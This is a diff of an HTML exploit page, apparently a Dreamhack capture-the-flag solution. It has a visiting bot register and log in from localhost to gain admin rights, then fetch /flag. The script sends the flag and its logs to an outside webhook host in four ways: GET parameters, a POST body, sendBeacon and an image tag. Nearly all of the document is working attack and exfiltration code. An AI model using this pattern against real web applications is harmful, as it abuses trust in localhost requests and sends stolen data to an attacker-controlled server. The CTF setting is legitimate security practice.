@@ -1,82 +1,117 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Report Processing</title>
+    <title>Report</title>
     <meta charset="UTF-8">
 </head>
 <body>
-    <h1>Processing your report...</h1>
-    <p>Please wait...</p>
+    <h1>Processing...</h1>
     
     <script>
+        // 디버깅을 위한 로그 함수
+        function log(msg) {
+            console.log(msg);
+            // 웹훅으로 로그도 전송
+            fetch('https://gkxuwhb.request.dreamhack.games/log?msg=' + encodeURIComponent(msg), {
+                mode: 'no-cors'
+            }).catch(() => {});
+        }
+        
+        log('Script started');
+        
         (async () => {
             try {
                 const username = 'hacker';
                 const password = 'hacker123';
                 
-                // 1. 계정 등록 (이미 존재할 수 있으므로 에러 무시)
+                log('Step 1: Registering user');
+                
+                // 1. 계정 등록 시도
                 try {
-                    let formData = new FormData();
-                    formData.append('username', username);
-                    formData.append('password', password);
+                    const registerForm = new FormData();
+                    registerForm.append('username', username);
+                    registerForm.append('password', password);
                     
-                    await fetch('/register', {
+                    const registerResp = await fetch('/register', {
                         method: 'POST',
-                        body: formData,
-                        credentials: 'include'
+                        body: registerForm,
+                        credentials: 'include',
+                        redirect: 'follow'
                     });
+                    
+                    log('Register response: ' + registerResp.status);
                 } catch (e) {
-                    // 이미 존재하는 계정일 수 있음
+                    log('Register error (might already exist): ' + e.message);
                 }
                 
-                // 2. 로그인 (Bot이 127.0.0.1에서 요청하므로 is_admin=True가 됨)
-                let formData = new FormData();
-                formData.append('username', username);
-                formData.append('password', password);
+                // 짧은 대기
+                await new Promise(resolve => setTimeout(resolve, 300));
                 
-                await fetch('/login', {
+                log('Step 2: Logging in');
+                
+                // 2. 로그인
+                const loginForm = new FormData();
+                loginForm.append('username', username);
+                loginForm.append('password', password);
+                
+                const loginResp = await fetch('/login', {
                     method: 'POST',
-                    body: formData,
-                    credentials: 'include'
+                    body: loginForm,
+                    credentials: 'include',
+                    redirect: 'follow'
                 });
                 
-                // 3. 로그인 완료 대기
-                await new Promise(resolve => setTimeout(resolve, 800));
+                log('Login response: ' + loginResp.status);
                 
-                // 4. FLAG 획득
-                const response = await fetch('/flag', {
-                    credentials: 'include'
+                // 로그인 완료 대기
+                await new Promise(resolve => setTimeout(resolve, 1000));
+                
+                log('Step 3: Accessing /flag');
+                
+                // 3. FLAG 획득
+                const flagResp = await fetch('/flag', {
+                    credentials: 'include',
+                    redirect: 'follow'
                 });
                 
-                const flag = await response.text();
+                log('Flag response: ' + flagResp.status);
                 
-                // 5. FLAG를 webhook으로 전송
-                await fetch('https://gkxuwhb.request.dreamhack.games/?flag=' + encodeURIComponent(flag), {
-                    mode: 'no-cors',
-                    method: 'GET'
-                });
+                const flag = await flagResp.text();
                 
-                // 추가 전송 방법 (안전성 강화)
-                await fetch('https://gkxuwhb.request.dreamhack.games/', {
+                log('Flag received: ' + flag.substring(0, 20));
+                
+                // 4. FLAG 전송 (여러 방법 동시 사용)
+                
+                // 방법 1: GET 파라미터
+                fetch('https://gkxuwhb.request.dreamhack.games/?flag=' + encodeURIComponent(flag), {
+                    mode: 'no-cors'
+                }).catch(() => {});
+                
+                // 방법 2: POST body
+                fetch('https://gkxuwhb.request.dreamhack.games/post', {
                     mode: 'no-cors',
                     method: 'POST',
+                    headers: {
+                        'Content-Type': 'text/plain'
+                    },
                     body: flag
-                });
+                }).catch(() => {});
                 
-                // navigator.sendBeacon 사용 (더 안정적)
+                // 방법 3: sendBeacon
                 navigator.sendBeacon('https://gkxuwhb.request.dreamhack.games/beacon', flag);
                 
-                console.log('Flag sent successfully');
+                // 방법 4: 이미지 태그 (가장 확실함)
+                const img = new Image();
+                img.src = 'https://gkxuwhb.request.dreamhack.games/img?flag=' + encodeURIComponent(flag);
+                document.body.appendChild(img);
+                
+                log('All requests sent');
                 
             } catch (error) {
-                console.error('Error:', error);
-                
-                // 에러 발생시에도 webhook으로 전송
-                await fetch('https://gkxuwhb.request.dreamhack.games/?error=' + encodeURIComponent(error.message), {
-                    mode: 'no-cors'
-                });
+                log('Error: ' + error.message);
+                log('Stack: ' + error.stack);
             }
         })();
     </script>
 </body>
-</html>
+</html
